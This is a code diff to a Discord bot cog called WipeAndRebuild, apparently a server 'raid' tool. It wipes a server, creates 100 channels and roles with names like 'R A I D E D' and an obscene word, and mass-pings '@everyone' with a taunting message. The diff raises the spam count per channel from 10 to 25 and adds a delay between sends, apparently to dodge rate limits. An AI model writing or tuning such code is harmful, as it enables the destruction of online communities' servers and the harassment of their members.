@@ -1,5 +1,6 @@
 import discord
 from discord.ext import commands
+import asyncio
 
 # Allowed users
 ALLOWED_USERS = [1402431821534330911, 1167531276467708055]  # replace with your ID(s)
@@ -8,7 +9,7 @@ ALLOWED_USERS = [1402431821534330911, 1167531276467708055]  # replace with your 
 NEW_CHANNEL_NAME = "R A I D E D"
 NEW_ROLE_NAME = "F U C K"
 NUM_TO_CREATE = 100  # Number of channels/roles to create after wipe
-NUM_MESSAGES = 10    # Number of messages to send in each channel
+NUM_MESSAGES = 25    # Number of messages to send in each channel
 MESSAGE_CONTENT = "@everyone GET CLAPPED MF 😭🙏"
 
 class WipeAndRebuild(commands.Cog):
@@ -100,6 +101,7 @@ class WipeAndRebuild(commands.Cog):
             for _ in range(NUM_MESSAGES):
                 try:
                     await channel.send(MESSAGE_CONTENT)
+                    await asyncio.sleep(0.5)
                 except:
                     continue
 
